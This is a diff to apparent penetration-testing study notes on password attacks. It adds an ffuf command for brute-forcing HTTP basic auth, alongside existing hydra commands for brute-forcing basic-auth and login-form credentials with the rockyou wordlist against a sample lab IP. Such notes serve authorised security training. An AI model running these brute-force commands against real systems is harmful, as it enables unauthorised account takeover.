@@ -13,6 +13,9 @@ pagetitle: Password Attacks
     - For basic auth: 
       - `sudo hydra -l {username} -P {pass_list} -f {IP} http-get "{EXACT_PATH}"`
         - If the path doesn't match exactly (for example, missing a `/`), you can get some confusing results
+      - This is slow, though, so I'd recommend using FFUF
+        - FFUF [released a quick script](https://github.com/ffuf/ffuf-scripts/tree/master) to easily make b64 users/passwords
+        - Then just `ffuf -u http://{endpoint} -w {list} -H "Authorization: Basic FUZZ" -fc 403`
 	- For normal web apps: provide a username, password list, IP, endpoint to post to, ^PASS^ for the password used, and a string in the HTTP of the failed result
 	- `sudo hydra -l {username} -P {password_list} {IP} http-post-form "/{endpoint}:{param1}=^PASS^:Login failed. Invalid"`
 		- So, for example: `sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:user=admin&password=^PASS^:Login failed. Invalid"`
